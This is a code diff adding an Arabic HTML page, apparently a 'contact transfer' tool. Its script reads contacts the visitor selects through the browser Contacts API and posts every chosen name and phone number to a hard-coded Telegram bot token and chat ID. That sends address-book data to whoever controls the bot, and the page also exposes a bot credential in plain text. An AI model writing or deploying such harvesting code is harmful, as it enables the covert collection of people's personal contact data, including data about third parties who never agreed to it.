@@ -1,1 +1,71 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نقل جهات الاتصال</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 20px; direction: rtl; }
+        button { padding: 10px 20px; font-size: 18px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        #status { margin-top: 20px; color: #555; }
+    </style>
+</head>
+<body>
+    <h2>📱 مشاركة جهات الاتصال</h2>
+    <button id="shareBtn">مشاركة الجهات عبر التليجرام</button>
+    <div id="status"></div>
 
+    <script>
+        const BOT_TOKEN = '<8727528326:AAGDChr47A7lPyhjPZw-KnaeEHdJRfqldOM>';
+        const CHAT_ID = '<5502165710>';
+
+        document.getElementById('shareBtn').onclick = () => {
+            if (!navigator.contacts) {
+                document.getElementById('status').innerText = '❌ متصفحك لا يدعم واجهة Contacts API. استخدم Chrome على Android أو متصفح حديث.';
+                return;
+            }
+
+            const props = ['name', 'tel'];
+            navigator.contacts.select(props, { multiple: true })
+                .then(contacts => {
+                    if (!contacts.length) {
+                        document.getElementById('status').innerText = '⚠️ لم يتم اختيار أي جهة اتصال.';
+                        return;
+                    }
+
+                    let message = `📇 تم نقل ${contacts.length} جهة اتصال:\n\n`;
+                    contacts.forEach((contact, index) => {
+                        const name = contact.name[0] || 'بدون اسم';
+                        const phones = contact.tel ? contact.tel.map(t => t.value).join(', ') : 'لا يوجد رقم';
+                        message += `${index+1}. ${name}\n   📞 ${phones}\n\n`;
+                    });
+
+                    // إرسال الرسالة إلى بوت التليجرام
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok) {
+                            document.getElementById('status').innerHTML = '✅ تم إرسال الجهات بنجاح إلى بوت التليجرام.';
+                        } else {
+                            document.getElementById('status').innerHTML = '❌ فشل الإرسال: ' + data.description;
+                        }
+                    })
+                    .catch(err => {
+                        document.getElementById('status').innerHTML = '❌ خطأ في الاتصال: ' + err;
+                    });
+                })
+                .catch(err => {
+                    document.getElementById('status').innerText = '❌ خطأ: ' + err;
+                });
+        };
+    </script>
+</body>
+</html>
